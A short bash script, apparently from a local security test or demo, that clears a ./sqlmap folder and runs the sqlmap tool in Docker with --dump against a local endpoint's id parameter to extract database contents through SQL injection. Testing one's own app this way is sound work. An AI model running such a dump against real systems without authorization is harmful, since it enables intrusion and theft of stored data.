#!/bin/bash

rm -rf ./sqlmap

# https://github.com/sqlmapproject/sqlmap

docker run --rm -it -v "/$(pwd)/sqlmap:/home/sqlmap/.sqlmap:rw" ilyaglow/sqlmap \
--dump \
--url http://host.docker.internal:8080/get-a-user-by-id?id=1
